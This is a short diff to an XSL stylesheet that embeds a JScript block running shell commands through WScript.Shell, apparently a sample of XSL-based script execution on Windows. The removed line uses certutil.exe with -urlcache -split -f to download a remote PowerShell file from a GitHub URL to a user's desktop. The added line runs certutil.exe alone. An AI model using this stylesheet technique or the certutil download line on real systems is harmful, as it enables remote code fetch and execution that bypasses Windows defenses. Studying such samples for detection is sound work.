@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	  var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\users\tony\desktop\test.txt");
+	  var r = new ActiveXObject("WScript.Shell").Run("certutil.exe");
 	]]> </ms:script>
 </stylesheet>
